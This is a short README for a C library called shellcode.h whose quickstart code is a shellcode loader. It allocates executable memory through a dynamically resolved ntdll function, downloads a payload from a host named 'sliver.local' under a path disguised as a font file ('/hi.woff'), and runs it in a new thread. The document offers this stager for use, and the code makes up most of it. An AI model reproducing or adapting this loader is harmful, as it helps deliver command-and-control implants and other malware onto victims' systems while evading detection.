# shellcode.h
Simple library (std indepent) to "download" a shellcode from a remote/local HTTP(s) server

# Quickstart
```c
#include "shellcode.h"

int main(void)
{
    // Allocate space for shellcode
    PVOID ShellcodeAddress = NULL;
    SIZE_T ShellcodeSize = 14001;

    ((NtAllocateVirtualMemory)ResolveFunction(L"ntdll.dll", "NtAllocateVirtualMemory"))
    (
        GetCurrentProcess(),
        &ShellcodeAddress,
        0,
        &ShellcodeSize,
        (MEM_COMMIT | MEM_RESERVE),
        PAGE_EXECUTE_READWRITE
    );

    // Download shellcode
    DownloadShellcode("sliver.local", 443, "/hi.woff", ShellcodeAddress, ShellcodeSize);
    
    // Execute
    HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)ShellcodeAddress, NULL, 0, 0);
    
    if (hThread == NULL)
    {
        ExitThread(0);
    }

    // WaitForSingleObject 
    while (1) {
        Sleep(1000);
    } 
}
```
